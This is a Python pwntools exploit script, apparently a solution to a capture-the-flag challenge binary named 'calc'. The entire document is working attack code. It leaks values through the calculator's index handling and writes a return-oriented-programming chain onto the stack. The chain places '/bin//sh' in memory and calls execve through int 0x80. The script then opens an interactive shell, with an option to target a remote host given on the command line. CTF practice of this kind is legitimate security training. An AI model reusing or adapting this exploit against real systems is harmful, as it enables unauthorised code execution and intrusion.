from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x08049433
continue
'''.format(**locals())

exe = './calc'

elf = context.binary = ELF(exe)

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

conn = start()

def add(index, data):
	conn.sendline(b'+' + index)
	leak = int(conn.recvline().decode(),10)
	if leak < 0:
		leak *= -1
	payload = b'+' + index
	payload += b'+' + str(u32(data)).encode()
	payload += b'-' + str(leak).encode()
	conn.sendline(payload)
	print(rl())
	

binsh_add = 0x80eb060
pop_ecx_ebx = 0x080701d1
pop_eax = 0x0805c34b
pop_edx =  0x080701aa
int0x80 = 0x08049a21
mov_edx_eax = 0x0809b30d

__bin = u32(b'/bin')
__sh = u32(b'//sh')

rl()
ropchain = [
	p32(pop_edx),
	p32(binsh_add),
	p32(pop_eax),
	p32(__bin),
	p32(mov_edx_eax),
	p32(pop_edx),
	p32(binsh_add + 4),
	p32(pop_eax),
	p32(__sh),
	p32(mov_edx_eax),
	p32(pop_eax),
	p32(0xb),
	p32(pop_edx),
	p32(binsh_add + 8),
	p32(pop_ecx_ebx),
	p32(binsh_add + 8),
	p32(binsh_add),
	p32(int0x80)
]

for i in range(361, 361 + len(ropchain)):
	#print(i, ropchain[i - 361])
	add(str(i).encode(), ropchain[i - 361])

sl(b'')

conn.interactive()
